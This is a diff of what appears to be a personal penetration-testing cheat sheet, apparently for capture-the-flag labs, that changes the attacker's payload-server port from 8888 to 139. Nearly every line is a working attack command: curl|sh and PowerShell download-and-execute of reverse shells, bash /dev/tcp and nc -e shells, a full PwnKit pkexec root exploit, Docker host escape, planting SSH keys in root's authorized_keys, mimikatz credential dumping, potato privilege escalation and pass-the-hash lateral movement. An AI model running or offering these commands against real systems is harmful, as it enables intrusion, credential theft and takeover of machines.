@@ -252,10 +252,10 @@ impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impa
 impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
 impacket-getTGT $DOM/'administrator':'123qweasdF!'; kcme
-impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-psexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-psexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Get-Content "$($_.FullName)\Desktop\user.txt","$($_.FullName)\Desktop\root.txt" -ErrorAction SilentlyContinue }
 gg ''
 
@@ -318,7 +318,7 @@ curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 https://www.php.net/manual/en/wrappers.php
 
 index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file://../../../../../../../etc/passwd
-index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:8888/resh|sh;
+index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:139/resh|sh;
 
 [*] WordPress
 wpscan --update > /dev/null; wpscan -e ap,t,tt,u --api-token $WPSCAN_API --url ://$DOM
@@ -348,7 +348,7 @@ http://$TARGET/help
 msfconsole -q -x 'use exploit/multi/http/gitlab_file_read_rce; set VHOST git.$DOM; set SSL true; set RHOSTS $TARGET; set RPORT 443; set USERNAME test; set PASSWORD testtest; set LHOST tun0; set LPORT 8787; set ForceExploit true; run'
 
 -->> Running Ports
-curl -s http://$MYIP:8888/linux/netstat.rb | ruby
+curl -s http://$MYIP:139/linux/netstat.rb | ruby
 
 -->> Change Password of User
 gitlab-rails console -e production
@@ -372,8 +372,8 @@ filename="..//app/app/views.py"
 @app.route('/x')
 def rev():
     import subprocess
-    subprocess.Popen("wget -qO- http://$MYIP:8888/resh|sh", shell=True)
-    subprocess.Popen("curl http://$MYIP:8888/resh|sh", shell=True)
+    subprocess.Popen("wget -qO- http://$MYIP:139/resh|sh", shell=True)
+    subprocess.Popen("curl http://$MYIP:139/resh|sh", shell=True)
     return ""
 
 [*] Node.js
@@ -420,7 +420,7 @@ curl -s -i -X POST -F "sendfile=@x.zip;type=application/zip" -F "submit=Upload" 
 
 +---------- Execute Command ----------+
 wsh http://$TARGET/x.php
-curl $MYIP:8888/resh|sh
+curl $MYIP:139/resh|sh
 curl -G 'http://$TARGET/x.php' --path-as-is --data-urlencode 'cmd=whoami /priv'
 
 [*] Splunk
@@ -473,7 +473,7 @@ python3 XDEBUG_SESSION.py
 curl http://$TARGET -H "Cookie: XDEBUG_SESSION="
 
 +---------- Execute Commands ----------+
-python_cmd >> system("curl $MYIP:8888/resh|sh")
+python_cmd >> system("curl $MYIP:139/resh|sh")
 
 [*] Curl
 curl -X GET --path-as-is 'http://$TARGET/../../../../../../../../../../../../windows/system32/drivers/etc/hosts'
@@ -711,7 +711,7 @@ export OWNED_COMPUTER='' # without $ sign
 impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
 impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
 impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
-kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 
 $OWNED_COMPUTER='' # without $ sign
 Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
@@ -722,7 +722,7 @@ Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoact
 .\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:backupadmin /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
 [+] Ticket successfully imported!
 kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
-kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:139/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
@@ -1421,10 +1421,10 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 # Post-Exploitation 
 ## Start Fileserver
-python3 -m http.server 8888 -d /Upload
+python3 -m http.server 139 -d /Upload
 
 ## Transfer Tools to a Proxy Box
-scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 8888 -d /Upload
+scp -C -r /Upload user@proxybox:/ ; ssh user@proxybox; python3 -m http.server 139 -d /Upload
 
 ## Ligolo - Port Forward and Pivot
 sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
@@ -1455,8 +1455,8 @@ sudo nmap -n -Pn -sS '192.168.110.51/24' --excludefile hosts -F --open --max-rat
 resh.py $MYIP 5555 /Upload/resh; resh.py $MYIP 5566 /Upload/resh_5566
 
 +---------- Execute resh ----------+
-curl -s http://$MYIP:8888/resh | sh
-wget -qO- http://$MYIP:8888/resh | sh
+curl -s http://$MYIP:139/resh | sh
+wget -qO- http://$MYIP:139/resh | sh
 
 +---------- Base64 Shell ----------+
 echo 'bash -i >& /dev/tcp/10.10.16.9/5555 0>&1' | base64
@@ -1474,12 +1474,12 @@ CTRL-Z; stty size; stty raw -echo; fg; export SHELL=bash; export TERM=xterm-256c
 export PATH=/dev/shm:$PATH
 
 [*] File Transfer
-curl -s http://$MYIP:8888/linux/linpeas.sh | sh
-wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
+curl -s http://$MYIP:139/linux/linpeas.sh | sh
+wget -qO- http://$MYIP:139/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-curl -s http://$MYIP:8888/whoami.sh | sh
+curl -s http://$MYIP:139/whoami.sh | sh
 
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
@@ -1488,7 +1488,7 @@ grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
 
 +---------- Full Privesc Scan ----------+
-curl -s http://$MYIP:8888/linux/linpeas.sh | sh
+curl -s http://$MYIP:139/linux/linpeas.sh | sh
 
 +---------- Groups ----------+
 newgrp developer
@@ -1500,14 +1500,14 @@ echo "6D7262336E5F41634064336D79210A" | xxd -r -p
 
 +---------- Malicious Files ----------+
 -->> .js
-echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:8888/resh_5566|sh', (err, stdout, stderr) => {});
+echo -e 'const { exec } = require('child_process');\nexec('curl $MYIP:139/resh_5566|sh', (err, stdout, stderr) => {});
 
 -->> .sh
-echo -e '#!/bin/bash\ncurl $MYIP:8888/resh_5566|sh'
+echo -e '#!/bin/bash\ncurl $MYIP:139/resh_5566|sh'
 echo 'bash -i'
 
 -->> curl cmd file
-echo -e 'url = "http://$MYIP:8888/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /dev/shm/cmd
+echo -e 'url = "http://$MYIP:139/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /dev/shm/cmd
 curl -s -K /dev/shm/cmd
 ssh -i ~/.ssh/ssh.key root@$TARGET
 
@@ -1568,14 +1568,14 @@ iw dev
 reaver -i mon0 -b 02:00:00:00:00:00 -vv
 
 +---------- Gnuplot ----------+
-echo 'system("curl $MYIP:8888/resh|sh")' > /opt/gnuplot/x.plt
+echo 'system("curl $MYIP:139/resh|sh")' > /opt/gnuplot/x.plt
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
 
 +---------- Port Scan Gateway ----------+
-curl -s $MYIP:8888/linux/nmap | sh
+curl -s $MYIP:139/linux/nmap | sh
 
 +---------- Bash SUID Exploits ----------+
 f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
@@ -1615,7 +1615,7 @@ cat /etc/shadow
 +---------- Docker ----------+
 curl -s --unix-socket /var/run/docker.sock http:/./images/json
 curl -s --unix-socket /var/run/docker.sock http:/./containers/json
-curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:8888/shells/resh | sh"]}'
+curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http:/./containers/create -d '{"Detach":true,"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Tty":false,"Image":"staging:latest","HostConfig":{"Binds": ["/:/var/tmp"]},"Cmd":["sh", "-c", "curl http://$MYIP:139/shells/resh | sh"]}'
 curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
 ls -la /var/tmp
 
@@ -1633,7 +1633,7 @@ docker run -v /:/mnt --rm --privileged -it tempimg chroot /mnt sh
 
 +---------- Run Image Privileged ----------+
 docker image list
-docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.10.16.9:8888/resh|sh'
+docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.10.16.9:139/resh|sh'
 
 +---------- Privileged: True ----------+
 cat docker-compose.yml | grep 'privileged: true'
@@ -1672,31 +1672,31 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 ## Windows
 [*] Initial Shell
 +---------- Execute ----------+
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5555"
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/resh.ps1');resh -Reverse $MYIP -Port 5555"
 \\$MYIP\$\nc.exe $MYIP 5555 -e cmd
 
 [*] File Transfer
 -->> Serve
-python3 -m http.server 8888 /Upload
+python3 -m http.server 139 /Upload
 impacket-smbserver share /Upload/windows
 
 -->> Transfer
-curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
-curl http://$MYIP:8888/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
-curl http://$MYIP:8888/windows/PowerView.ps1 -o \programdata\PowerView.ps1
-curl http://$MYIP:8888/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
-curl http://$MYIP:8888/windows/Rubeus.exe -o \programdata\Rubeus.exe
-curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
-wget http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:139/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:139/windows/EfsPotato.exe -o \programdata\EfsPotato.exe
+curl http://$MYIP:139/windows/PowerView.ps1 -o \programdata\PowerView.ps1
+curl http://$MYIP:139/windows/PrivescCheck.ps1 -o \programdata\PrivescCheck.ps1
+curl http://$MYIP:139/windows/Rubeus.exe -o \programdata\Rubeus.exe
+curl http://$MYIP:139/bat2exe.bat -o \programdata\bat2exe.bat
+wget http://$MYIP:139/windows/nc.exe -o \programdata\nc.exe
 copy \\$MYIP\$\nc.exe \programdata
-certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
+certutil -urlcache -f http://$MYIP:139/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/whoami')
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/whoami')
 
 +---------- Full Privesc Scan ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/PrivescCheck.ps1');Invoke-PrivescCheck
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/windows/PrivescCheck.ps1');Invoke-PrivescCheck
 
 +---------- Pre Windows 2000 ----------+
 cat computers | cut -d '$' -f1 > PRE2k
@@ -1715,25 +1715,25 @@ nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
 +---------- Switch User: Known Creds ----------+
 rlwrap nc -lvnp 5566
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
 
 +---------- Restore AD Objects ----------+
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
 +---------- DPAPI ----------+
-curl http://$MYIP:8888/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+curl http://$MYIP:139/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
 dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
 
 +---------- SeBackupPrivilege ----------+
-$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
+$a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:139/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
 robocopy /b \users\administrator\desktop\ .; type \users\administrator\desktop\root.txt
 $a.GetExportedTypes() | ForEach-Object { $_.FullName }
 [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils].GetMethods() | ft Name, IsStatic, ReturnType
 
 +---------- SeImpersonatePrivilege ----------+
-forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/resh.ps1');resh -Reverse $MYIP -Port 5566"""
+forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd /c \\$MYIP\$\EfsPotato.exe """powershell -c IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/resh.ps1');resh -Reverse $MYIP -Port 5566"""
 wmic process call create "\\$MYIP\$\EfsPotato.exe \"\\$MYIP\$\nc.exe $MYIP 5566 -e cmd\""
 wmic process call create "\\$MYIP\$\jp32.exe -l 1337 -p \"cmd.exe\" -a \"/c \\$MYIP\$\nc.exe $MYIP 5566 -e cmd\"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 wmic process call create "\\$MYIP\$\churrasco.exe -d \"\\$MYIP\$\nc.exe -e cmd.exe $MYIP 5566\""
@@ -1747,7 +1747,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o /Uplo
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\$\x.dll
 
 +---------- Malicious .lnk ----------+
-curl http://$MYIP:8888/windows/nc.exe -o \programdata\nc.exe
+curl http://$MYIP:139/windows/nc.exe -o \programdata\nc.exe
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\programdata\nc.exe'; $sc.Arguments = '$TARGET 5566 -e cmd.exe'; $sc.Save()"
 powershell -c "$s = New-Object -ComObject WScript.Shell; $sc = $s.CreateShortcut('C:\Common Applications\Notepad.lnk'); $sc.TargetPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; $sc.Arguments = '\\$TARGET\\x'; $sc.Save()"
 
@@ -1781,10 +1781,10 @@ powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 +---------- Shell From Memory ----------+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/windows/0.ps1')"
 
 +---------- Other Exploits ----------+
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5566 -e cmd\"" -z
 C:\programdata\jp32.exe -l 1337 -p "cmd.exe" -a "/c \programdata\nc.exe $MYIP 5678 -e cmd"  -t * -c {3c6859ce-230b-48a4-be6c-932c0c202048}
 https://ohpe.it/juicy-potato/CLSID/
